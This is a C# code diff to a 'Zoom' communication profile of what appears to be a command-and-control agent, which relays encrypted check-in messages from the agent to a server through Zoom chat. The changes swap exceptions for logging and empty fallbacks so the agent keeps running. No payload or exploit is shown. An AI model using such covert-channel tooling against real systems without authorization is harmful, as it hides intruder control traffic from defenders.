@@ -76,17 +76,25 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            var opts = JsonSerializer.Deserialize(
-                ChannelConfig.Decode(),
-                ZoomChannelOptionsJsonContext.Default.ZoomChannelOptions)
-                ?? throw new InvalidOperationException("Invalid Zoom profile configuration");
-            accountId = opts.AccountId;
-            clientId = opts.ClientId;
-            clientSecret = opts.ClientSecret;
-            userId = opts.UserId;
-            channelId = opts.ChannelId;
-            apiBase = opts.ApiBase;
-            oauthBase = opts.OAuthBase;
+            ZoomChannelOptions? opts = null;
+            try
+            {
+                opts = JsonSerializer.Deserialize(
+                    ChannelConfig.Decode(),
+                    ZoomChannelOptionsJsonContext.Default.ZoomChannelOptions);
+            }
+            catch (Exception ex)
+            {
+                this.logger.Log($"Failed to deserialize Zoom channel options: {ex.Message}");
+            }
+            opts ??= new ZoomChannelOptions();
+            accountId = opts.AccountId ?? string.Empty;
+            clientId = opts.ClientId ?? string.Empty;
+            clientSecret = opts.ClientSecret ?? string.Empty;
+            userId = opts.UserId ?? string.Empty;
+            channelId = opts.ChannelId ?? string.Empty;
+            apiBase = opts.ApiBase ?? string.Empty;
+            oauthBase = opts.OAuthBase ?? string.Empty;
 
             HttpClientHandler handler = new HttpClientHandler();
             this._client = new HttpClient(handler);
@@ -119,7 +127,8 @@ namespace Agent.Profiles
             string body = await resp.Content.ReadAsStringAsync();
             if (!resp.IsSuccessStatusCode)
             {
-                throw new Exception($"Zoom OAuth failed: {(int)resp.StatusCode} {body}");
+                Console.Error.WriteLine($"[zoom] Zoom OAuth failed: {(int)resp.StatusCode} {body}");
+                return string.Empty;
             }
             using JsonDocument doc = JsonDocument.Parse(body);
             _token = doc.RootElement.GetProperty("access_token").GetString() ?? string.Empty;
@@ -704,7 +713,10 @@ namespace Agent.Profiles
             try
             {
                 if (!await PostEncrypted(DIR_AGENT_TO_SERVER, encrypted))
-                    throw new IOException("Zoom rejected an outbound chat message.");
+                {
+                    Console.Error.WriteLine("[zoom] checkin post failed: Zoom rejected an outbound chat message.");
+                    return new CheckinResponse() { status = "failed" };
+                }
             }
             catch (Exception e)
             {
